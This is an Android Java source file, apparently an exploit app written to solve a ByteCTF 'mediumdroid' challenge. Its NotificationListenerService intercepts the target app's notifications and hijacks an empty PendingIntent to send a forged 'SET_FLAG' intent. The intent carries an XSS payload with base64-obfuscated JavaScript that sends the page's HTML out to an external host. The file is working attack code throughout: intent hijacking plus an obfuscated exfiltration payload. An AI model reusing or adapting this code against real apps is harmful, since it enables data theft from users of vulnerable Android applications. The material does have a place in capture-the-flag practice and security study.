package com.bytectf.pwnmediumdroid;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

public class MagicService extends NotificationListenerService {
    private static final String TAG = "MagicService";
    private static final String xssExp = "<img src=\"x\" onerror=\"eval(atob('" +
            "bmV3IEltYWdlKCkuc3JjID0gImh0dHA6Ly90b3V0aWFvLmNvbS5ieXRlY3RmLndybHVzLmNvbT9mbGFn" +
            "PSIgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImh0bWwi" +
            "KVswXS5pbm5lckhUTUwp'))\">";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return Service.START_STICKY_COMPATIBILITY;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (!"com.bytectf.mediumdroid".equals(sbn.getPackageName())) {
            return;
        }
        Notification notification = sbn.getNotification();
        if (notification == null) {
            return;
        }
        Bundle extras = notification.extras;
        if (extras != null) {
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            String content = extras.getString(Notification.EXTRA_TEXT, "");
            Log.d(TAG, "Received notification: Title="+title+", content="+content);
            PendingIntent pendingIntent = notification.contentIntent;
            if (pendingIntent != null) {
//                    Hack the empty PendingIntent
                Intent fillInIntent = new Intent();
                fillInIntent.setClassName("com.bytectf.mediumdroid",
                        "com.bytectf.mediumdroid.FlagReceiver");
                fillInIntent.setAction("com.bytectf.SET_FLAG");
                fillInIntent.putExtra("flag", xssExp);

                try {
                    pendingIntent.send(this, 0, fillInIntent);
                    Log.d(TAG, "PendingIntent sent with SET_FLAG");
                    MainActivity.pendingIntentSent = true;
                } catch (PendingIntent.CanceledException e) {
                    e.printStackTrace();
                }
            }

        }
    }
}